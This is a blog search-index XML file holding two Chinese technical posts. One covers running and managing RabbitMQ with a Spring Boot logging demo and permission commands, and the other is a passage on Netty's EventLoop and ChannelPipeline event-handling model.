<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
    
    <entry>
      <title><![CDATA[RabbitMQ实战：运行和管理RabbitMQ]]></title>
      <url>https://qqdong.github.io/2018/04/04/RabbitMQ%E5%AE%9E%E6%88%98%EF%BC%9A%E8%BF%90%E8%A1%8C%E5%92%8C%E7%AE%A1%E7%90%86Rabbit/</url>
      <content type="html"><![CDATA[<blockquote>
<p>本系列是「RabbitMQ实战：高效部署分布式消息队列」书籍的总结笔记。</p>
</blockquote>
<p><a href="http://qqidol.com/2018/04/01/RabbitMQ%E5%AE%9E%E6%88%98%EF%BC%9A%E7%90%86%E8%A7%A3%E6%B6%88%E6%81%AF%E9%80%9A%E4%BF%A1/" target="_blank" rel="noopener">上一篇</a> 介绍了AMQP消息通信，包括队列、交换器和绑定，通过虚拟主机还可以隔离数据和权限，消息持久化和发送方确认模式确保了消息不丢失。</p>
<p>本篇主要介绍如何运行和管理RabbitMQ，在介绍之前，会有个DEMO演示消息发送和接收，一方面对AMQP的元素有更直观的认识，一方面为后面介绍监控做数据来源。</p>
<p>通过介绍，你会了解到：</p>
<ul>
<li>消息发送和接收简单实现</li>
<li>服务器管理-启动和停止节点</li>
<li>权限配置</li>
<li>使用统计</li>
</ul>
<a id="more"></a>
<h3 id="消息发送和接收简单实现"><a href="#消息发送和接收简单实现" class="headerlink" title="消息发送和接收简单实现"></a>消息发送和接收简单实现</h3><p>该Demo主要用于收集日志，消息发送者是各个应用子系统，消息接收者是日志收集服务，使用RabbitMQ可以很容易实现。</p>
<p>基于Spring Boot框架实现，主要类的作用如下：</p>
<ul>
<li>LogRabbitConfig：创建队列、交换器、绑定等初始化操作；</li>
<li>Sender：消息发送者；</li>
<li>AllReceiver：所有级别日志接收者，接收所有级别的日志；</li>
<li>ErrorReceiver：错误级别日志接受者，只接收错误级别的日志；</li>
<li>LogSenderTest：测试用例类；</li>
</ul>
<p>消息模型如下：<br><img src="http://oc3r3rke2.bkt.clouddn.com/15230237956357.jpg?imageView2/2/w/400" alt="Demo的消息模型"></p>
<h5 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h5><p>首先，配置spring boot和rabbitmq依赖：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.1.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">relativePath</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!--rabbitmq依赖--&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-amqp<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>然后在application.properties文件中配置rabbitmq地址：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">spring.rabbitmq.host=127.0.0.1</span><br><span class="line">spring.rabbitmq.port=5672</span><br><span class="line">spring.rabbitmq.username=guest</span><br><span class="line">spring.rabbitmq.password=guest</span><br><span class="line">spring.rabbitmq.publisher-confirms=true</span><br><span class="line">spring.rabbitmq.virtual-host=/</span><br></pre></td></tr></table></figure>
<h5 id="LogRabbitConfig实现"><a href="#LogRabbitConfig实现" class="headerlink" title="LogRabbitConfig实现"></a>LogRabbitConfig实现</h5><blockquote>
<p>使用Spring的@Configuration定义配置类，可替换xml配置文件,被注解的类内部包含有一个或多个被@Bean注解的方法,用于构建bean定义，初始化Spring容器。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LogRabbitConfig</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">static</span> String QUEUE_LOG_ERROR = <span class="string">"log.error"</span>;</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">static</span> String QUEUE_LOG_ALL = <span class="string">"log.all"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建log.error队列</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Queue <span class="title">logError</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Queue(QUEUE_LOG_ERROR);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//创建log.all队列</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Queue <span class="title">logAll</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Queue(QUEUE_LOG_ALL);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//创建exchange，命名为log</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function">TopicExchange <span class="title">exchange</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> TopicExchange(<span class="string">"log"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//绑定log.error队列到exchange，routingkey为log.error</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function">Binding <span class="title">bindingExchangeError</span><span class="params">(Queue logError, TopicExchange exchange)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> BindingBuilder.bind(logError).to(exchange).with(<span class="string">"log.error"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//绑定log.all队列到exchange，routingkey为log.#</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function">Binding <span class="title">bindingExchangeAll</span><span class="params">(Queue logAll, TopicExchange exchange)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> BindingBuilder.bind(logAll).to(exchange).with(<span class="string">"log.#"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="Sender实现"><a href="#Sender实现" class="headerlink" title="Sender实现"></a>Sender实现</h5><p>各个子系统向rabbitmq服务器发送消息：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Sender</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> AmqpTemplate rabbitTemplate;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">send</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//向mq服务端发送消息，exchange为log，routingkey为log.error</span></span><br><span class="line">        String context = <span class="string">"error log"</span>;</span><br><span class="line">        <span class="keyword">this</span>.rabbitTemplate.convertAndSend(<span class="string">"log"</span>, <span class="string">"log.error"</span>, context);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//向mq服务端发送消息，exchange为log，routingkey为log.info</span></span><br><span class="line">        context = <span class="string">"info log"</span>;</span><br><span class="line">        System.out.println(<span class="string">"send msg : "</span> + context);</span><br><span class="line">        <span class="keyword">this</span>.rabbitTemplate.convertAndSend(<span class="string">"log"</span>, <span class="string">"log.info"</span>, context);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//向mq服务端发送消息，exchange为log，routingkey为log.warn</span></span><br><span class="line">        context = <span class="string">"warn log"</span>;</span><br><span class="line">        System.out.println(<span class="string">"send msg : "</span> + context);</span><br><span class="line">        <span class="keyword">this</span>.rabbitTemplate.convertAndSend(<span class="string">"log"</span>, <span class="string">"log.warn"</span>, context);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="AllReceiver和ErrorReceiver实现"><a href="#AllReceiver和ErrorReceiver实现" class="headerlink" title="AllReceiver和ErrorReceiver实现"></a>AllReceiver和ErrorReceiver实现</h5><p>从rabbitmq服务器接收消息。</p>
<p>AllReceiver从服务器的log.all队列获取消息，因为它绑定的routingkey为”log.#”，所以，会收到所有级别的日志：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@RabbitListener</span>(queues = <span class="string">"log.all"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AllReceiver</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RabbitHandler</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">process</span><span class="params">(String context)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"receive log : "</span> + context);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ErrorReceiver从服务器的log.error队列获取消息，因为它绑定的routingkey为”log.error”，所以，只会收到error级别的日志：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@RabbitListener</span>(queues = <span class="string">"log.error"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ErrorReceiver</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RabbitHandler</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">process</span><span class="params">(String context)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"receive error : "</span> + context);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="LogSenderTest测试用例"><a href="#LogSenderTest测试用例" class="headerlink" title="LogSenderTest测试用例"></a>LogSenderTest测试用例</h5><p>测试用例很简单，就是调用Sender发送消息，观察消息的接收情况。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RunWith</span>(SpringRunner.class)</span><br><span class="line"><span class="meta">@SpringBootTest</span></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LogSenderTest</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    Sender sender;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sendLog</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        sender.send();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行日志如下：<br><img src="http://oc3r3rke2.bkt.clouddn.com/15230234561541.jpg?imageView2/2/w/400" alt="运行日志"></p>
<p>可以看到，error收到了2次，说明exchange同时分发给了log.all和log.error队列，其他级别的日志分发给了log.all队列。</p>
<h3 id="服务器管理-启动和停止节点"><a href="#服务器管理-启动和停止节点" class="headerlink" title="服务器管理-启动和停止节点"></a>服务器管理-启动和停止节点</h3><p>RabbitMQ是用Erlang编写的，Erlang天生就能让应用程序无需知道对方是否在同一台机器上即可相互通信，这让集群和可靠的消息路由变得简单。</p>
<h5 id="理解节点和Erlang应用程序"><a href="#理解节点和Erlang应用程序" class="headerlink" title="理解节点和Erlang应用程序"></a>理解节点和Erlang应用程序</h5><p>和Java有JVM虚拟机类似，Erlang也有虚拟机，虚拟机的每个实例称之为「节点」，不同的是，多个Erlang应用程序可以运行在同一个节点之上，如果应用程序崩溃了，Erlang节点会自动尝试自动重启应用程序。</p>
<p>节点的操作：</p>
<ul>
<li>后台启动节点：./rabbitmq-server -detached</li>
<li>停止节点：./rabbitmqctl stop </li>
<li>仅停止rabbit应用程序：./rabbitmqctl stop_app</li>
</ul>
<h5 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h5><p>配置文件的格式本质上是原始的Erlang数据结构，是一个包含了嵌套哈希表的数组，如下：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">    [mnesia , [&#123;dump_log_write_threshold , 1000&#125;]],</span><br><span class="line">    [rabbit , [&#123;vm_memory_high_wateremark , 0.4&#125;]]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>上面配置了2个应用，每个应用会有自己的哈希表来配置选项：</p>
<ul>
<li>mnesia：是rabbitmq用来存储交换器和队列元数据的；</li>
<li>rabbit：是rabbitmq特定的配置选项；</li>
</ul>
<p>每个应用如果有多个选项，用逗号隔开。</p>
<h3 id="权限配置"><a href="#权限配置" class="headerlink" title="权限配置"></a>权限配置</h3><p>RabbitMQ权限系统中，单个用户可以跨越多个vhost进行授权，而且可以对读、写、配置分别授权。</p>
<p>首先创建一个用户dongqingqing，密码为123456：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./rabbitmqctl add_user dongqingqing 123456</span><br></pre></td></tr></table></figure>
<p>授予dongqingqing用户权限，可以读取所有队列和交换器，只可写log.*格式的队列和交换器，无法创建或删除队列和交换器</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./rabbitmqctl set_permissions  dongqingqing ".*" "log.*" ""</span><br></pre></td></tr></table></figure>
<p>set_permissions 后面的参数分别为用户名、读权限、写权限、配置权限。</p>
<p>其他详细用法可查看文档。</p>
<h3 id="使用统计"><a href="#使用统计" class="headerlink" title="使用统计"></a>使用统计</h3><h5 id="查看数据统计"><a href="#查看数据统计" class="headerlink" title="查看数据统计"></a>查看数据统计</h5><p>可通过rabbitmqctl命令查看数据统计信息，比如队列和消息数目、交换器和绑定等。</p>
<p>查看所有队列，包含上面demo定义的log.all和log.error：<br><img src="http://oc3r3rke2.bkt.clouddn.com/15230258944759.jpg?imageView2/2/w/400" alt="查看所有队列"></p>
<p>查看所有交换器，包含上面demo定义的log<br><img src="http://oc3r3rke2.bkt.clouddn.com/15230259391498.jpg?imageView2/2/w/400" alt="查看所有交换器"></p>
<p>另外，rabbitmq提供了管理界面插件，更方便的查看各种统计，可以通过下面的命令开启：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./rabbitmq-plugins enable rabbitmq_management</span><br></pre></td></tr></table></figure>
<p><img src="http://oc3r3rke2.bkt.clouddn.com/15230262154620.jpg" alt="rabbitmq_management插件"></p>
<h5 id="查看日志"><a href="#查看日志" class="headerlink" title="查看日志"></a>查看日志</h5><p>可以在文件系统中查看日志，启动rabbitmq后，会显示日志的路径：<br><img src="http://oc3r3rke2.bkt.clouddn.com/15230264497340.jpg" alt="rabbitmq日志路径"></p>
<p>另外，可以通过AMQP获取实时日志信息，有一个amq.rabbitmq.log的topic交换器，监听对应的队列即可。</p>
<p>下一篇将介绍消息通信模式和最佳实践，感谢大家持续关注。</p>
<p><strong>欢迎扫描下方二维码，关注我的个人微信公众号 ~</strong></p>
<p><div align="center"><br><img src="http://upload-images.jianshu.io/upload_images/115629-5a140433dc5e61ad.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="情情说"></div></p>
]]></content>
      
        <categories>
            
            <category> 消息队列 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> RabbitMQ </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Netty事件监听和处理（下）]]></title>
      <url>https://qqdong.github.io/2018/04/04/Netty%E4%BA%8B%E4%BB%B6%E7%9B%91%E5%90%AC%E5%92%8C%E5%A4%84%E7%90%86%EF%BC%88%E4%B8%8B%EF%BC%89/</url>
      <content type="html"><![CDATA[<p><a href="http://qqidol.com/2018/04/03/Netty%E4%BA%8B%E4%BB%B6%E7%9B%91%E5%90%AC%E5%92%8C%E5%A4%84%E7%90%86%EF%BC%88%E4%B8%8A%EF%BC%89/" target="_blank" rel="noopener">上一篇</a> 介绍了事件监听、责任链模型、socket接口和IO模型、线程模型等基本概念，以及Netty的整体结构，这篇就来说下Netty三大核心模块之一：事件监听和处理。</p>
<p>前面提到，Netty是一个NIO框架，它将IO通道的建立、可读、可写等状态变化，抽象成事件，以责任链的方式进行传递，可以在处理链上插入自定义的Handler，对感兴趣的事件进行监听和处理。</p>
<p>通过介绍，你会了解到：</p>
<ul>
<li>事件监听和处理模型</li>
<li>事件监听：EventLoop</li>
<li>事件处理：ChannelPipeline和ChannelHandler</li>
<li>使用Netty实现Websocket协议</li>
</ul>
<p>文章末尾有福利 ~</p>
<a id="more"></a>
<h3 id="事件监听和处理模型"><a href="#事件监听和处理模型" class="headerlink" title="事件监听和处理模型"></a>事件监听和处理模型</h3><p>进行网络编程时，一般的编写过程是这样的：</p>
<ul>
<li>创建服务端Socket，监听某个端口；</li>
<li>当有客户端连接时，会创建一个新的客户端Socket，监听数据的可读、可写状态，每一个连接请求都会创建一个客户端Socket；</li>
<li>读取和写入数据都会调用Socket提供的接口，接口列表在上一篇提到过；</li>
</ul>
<p>传统的模型，每个客户端Socket会创建一个单独的线程监听socket事件，一方面系统可创建的线程数有限，限制了并发数，一方面线程过多，线程切换频繁，导致性能严重下降。</p>
<p>随着操作系统IO模型的发展，可以采用多路复用IO，一个线程监听多个Socket，另外，服务端处理客户端连接，与客户端Socket的监听，可以在不同的线程进行处理。</p>
<p>Netty就是采用多路复用IO进行事件监听，另外，使用不同的线程分别处理客户端的连接、数据读写。</p>
<p>整个处理结构如下图，简单说明下：</p>
<ul>
<li>Boss EventLoopGroup主要处理客户端的connect事件，包含多个EventLoop，每个EventLoop一个线程；</li>
<li>Worker EventLoopGroup主要处理客户端Socket的数据read、write事件，包含多个EventLoop，每个EventLoop一个线程；</li>
<li>无论是Boos还是Worker，事件的处理都是通过Channel Pipleline组织的，它是责任链模式的实现，包含一个或多个Handler；</li>
<li>侦听一个端口，只会绑定到Boss EventLoopGroup中的一个Eventloop；</li>
<li>Worker EventLoopGroup中的一个Eventloop，可以监听多个客户端Socket；</li>
</ul>
<p><img src="http://oc3r3rke2.bkt.clouddn.com/15228498633200.jpg" alt="事件监听和处理模型"></p>
<h3 id="EventLoop"><a href="#EventLoop" class="headerlink" title="EventLoop"></a>EventLoop</h3><p>一个EventLoop其实和一个特定的线程绑定, 并且在其生命周期内, 绑定的线程都不会再改。</p>
<p>EventLoop肩负着两种任务：</p>
<ul>
<li>第一个是作为 IO 线程, 执行与 Channel 相关的 IO 操作, 包括 调用select等待就绪的IO事件、读写数据与数据的处理等；</li>
<li>第二个任务是作为任务队列, 执行 taskQueue 中的任务, 例如用户调用eventLoop.schedule提交的定时任务也是这个线程执行的；</li>
</ul>
<p>第一个任务比较好理解，主要解释下第二个：从socket数据到数据处理，再到写入响应数据，Netty都在一个线程中处理，主要是为了线程安全考虑，减少竞争和线程切换，通过任务队列的方式，可以在用户线程提交处理逻辑，在Eventloop中执行。</p>
<p>整个EventLoop干的事情就是select -&gt; processIO -&gt; runAllTask，processIO处理IO事件相关的逻辑，runAllTask处理任务队列中的任务，如果执行的任务过多，会影响IO事件的处理，所以会限制任务处理的时间，整个处理过程如下图：</p>
<p><img src="http://oc3r3rke2.bkt.clouddn.com/15228517408747.jpg" alt="EventLoop处理过程"></p>
<p>EventLoop的run代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">     <span class="keyword">for</span> (; ; ) &#123;</span><br><span class="line">         oldWakenUp = wakenUp.getAndSet(<span class="keyword">false</span>);</span><br><span class="line">         <span class="keyword">try</span> &#123;</span><br><span class="line">             <span class="keyword">if</span> (hasTasks()) &#123; <span class="comment">//如果有任务，快速返回</span></span><br><span class="line">                 selectNow();</span><br><span class="line">             &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                 select(); <span class="comment">//如果没任务，等待事件返回</span></span><br><span class="line">                 <span class="keyword">if</span> (wakenUp.get()) &#123;</span><br><span class="line">                     selector.wakeup();</span><br><span class="line">                 &#125;</span><br><span class="line">             &#125;</span><br><span class="line">             cancelledKeys = <span class="number">0</span>;</span><br><span class="line">             <span class="keyword">final</span> <span class="keyword">long</span> ioStartTime = System.nanoTime();</span><br><span class="line">             needsToSelectAgain = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">             <span class="comment">//处理IO事件</span></span><br><span class="line">             <span class="keyword">if</span> (selectedKeys != <span class="keyword">null</span>) &#123;</span><br><span class="line">                 processSelectedKeysOptimized(selectedKeys.flip());</span><br><span class="line">             &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                 processSelectedKeysPlain(selector.selectedKeys());</span><br><span class="line">             &#125;</span><br><span class="line"></span><br><span class="line">             <span class="comment">//计算IO处理时间</span></span><br><span class="line">             <span class="keyword">final</span> <span class="keyword">long</span> ioTime = System.nanoTime() - ioStartTime;</span><br><span class="line">             <span class="keyword">final</span> <span class="keyword">int</span> ioRatio = <span class="keyword">this</span>.ioRatio; <span class="comment">//默认为50</span></span><br><span class="line"></span><br><span class="line">             <span class="comment">//处理提交的任务</span></span><br><span class="line">             runAllTasks(ioTime * (<span class="number">100</span> - ioRatio) / ioRatio);</span><br><span class="line"></span><br><span class="line">             <span class="keyword">if</span> (isShuttingDown()) &#123;</span><br><span class="line">                 closeAll();</span><br><span class="line">                 <span class="keyword">if</span> (confirmShutdown()) &#123;</span><br><span class="line">                     <span class="keyword">break</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">             &#125;</span><br><span class="line">         &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">             <span class="keyword">try</span> &#123;</span><br><span class="line">                 Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">             &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<h3 id="ChannelPipeline和ChannelHandler"><a href="#ChannelPipeline和ChannelHandler" class="headerlink" title="ChannelPipeline和ChannelHandler"></a>ChannelPipeline和ChannelHandler</h3><p>ChannelPipeline是一个接口，其有一个默认的实现类DefaultChannelPipeline，内部有两个属性：head和tail，<br>这两者都实现了ChannelHandler接口，对应处理链的头和尾。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">protected</span> <span class="title">DefaultChannelPipeline</span><span class="params">(Channel channel)</span> </span>&#123;</span><br><span class="line">     <span class="keyword">this</span>.channel = ObjectUtil.checkNotNull(channel, <span class="string">"channel"</span>);</span><br><span class="line">     succeededFuture = <span class="keyword">new</span> SucceededChannelFuture(channel, <span class="keyword">null</span>);</span><br><span class="line">     voidPromise =  <span class="keyword">new</span> VoidChannelPromise(channel, <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">     tail = <span class="keyword">new</span> TailContext(<span class="keyword">this</span>);</span><br><span class="line">     head = <span class="keyword">new</span> HeadContext(<span class="keyword">this</span>);</span><br><span class="line"></span><br><span class="line">     head.next = tail;</span><br><span class="line">     tail.prev = head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>每个Channel创建时，会创建一个ChannelPipeline对象，来处理channel的各种事件，可以在运行时动态进行动态修改其中的 ChannelHandler。</p>
<p>ChannelHandler承载业务处理逻辑的地方，我们接触最多的类，可以自定义Handler，加入处理链中，实现自定义逻辑。</p>
<p>ChannelHandler 可分为两大类：ChannelInboundHandler 和 ChannelOutboundHandle，这两接口分别对应入站和出站消息的处理，对应数据读取和数据写入。它提供了接口方法供我们实现，处理各种事件。</p>
